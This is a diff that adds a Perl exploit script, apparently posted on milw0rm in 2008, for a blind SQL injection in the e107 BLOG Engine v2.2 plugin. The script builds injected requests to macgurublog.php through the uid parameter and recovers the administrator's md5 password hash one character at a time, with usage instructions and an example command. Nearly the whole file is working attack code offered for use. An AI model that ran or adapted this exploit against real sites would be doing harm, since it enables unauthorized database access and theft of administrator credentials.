@@ -1,0 +1,90 @@
+#!/usr/bin/perl 
+#####################################################################################
+#         e107 Plugin BLOG Engine v2.2 Blind SQL Injection Exploit                  #
+#                           ..::virangar security team::..                          #
+#                              www.virangar.net                                     #
+#                 C0d3d BY:virangar security team ( hadihadi  )                     #
+#special tnx to:                                                                    #
+#MR.nosrati,black.shadowes,MR.hesy,Ali007,Zahra                                     #
+#& all virangar members & all hackerz                                               #
+# my lovely friends hadi_aryaie2004 & arash(imm02tal)                               #
+#             ..:::Young Iranina Hackerz::..                                        #
+#####################################################################################
+#[-] note: becuse e107 using diffrent prefix/table names may it's not work good,but i wrote it for default mod  ;) 
+#this code is for english e107's only,if you want work on other languages,you can edit line 67;)
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+if (@ARGV != 1){
+header();
+}
+
+$host = $ARGV[0];
+
+print "\n md5 Password:\r\n";
+&halghe();
+print "\n[+]Done\n";
+
+
+sub halghe {
+for($i = 1; $i <= 32; $i++){
+ $f = 0;
+ $n = 48;
+ while(!$f && $n <= 57)
+ {
+  if(&inject($host, $i, $n,)){
+ $f = 1;
+     syswrite(STDOUT, chr($n), 1);
+   }
+$n++;
+}
+if(!$f){ 
+$n=97;
+while(!$f && $n <= 102)
+ {
+  if(&inject($host, $i, $n,)){
+ $f = 1;
+     syswrite(STDOUT, chr($n), 1);
+   }
+$n++;
+}}
+}
+}
+sub inject {
+my $site = $_[0];
+my $a = $_[1];
+my $b = $_[2];
+
+$col = "user_password";
+
+$attack= "$site"."%20and%20substring((select%20"."$col"."%20from%20e107_user%20where%20user_id=1%20limit%200,1),"."$a".",1)=char("."$b".")/*";
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$req = $b->request(HTTP::Request->new(GET=>$attack));
+$res = $req->content;
+
+if ($res !~ /The user has hidden their blog./i){
+    return 1;
+}
+
+}
+sub header {
+print qq{
+###################################################################
+# e107 Plugin BLOG Engine v2.2 Blind SQL Injection Exploit        #
+#                  (just for english e107's)                      #
+#                      www.virangar.net                           #
+#   Useage: perl $0 Host                                          #
+#                                                                 #
+#   Host: full patch to macgurublog.php+uid (dont forget http://) #
+#                                                                 #
+#  Example:                                                       #
+# perl $0 http://site/macgurublog_menu/macgurublog.php?uid=5      #
+#                                                                 #
+###################################################################
+};
+}
+
+# milw0rm.com [2008-07-29]
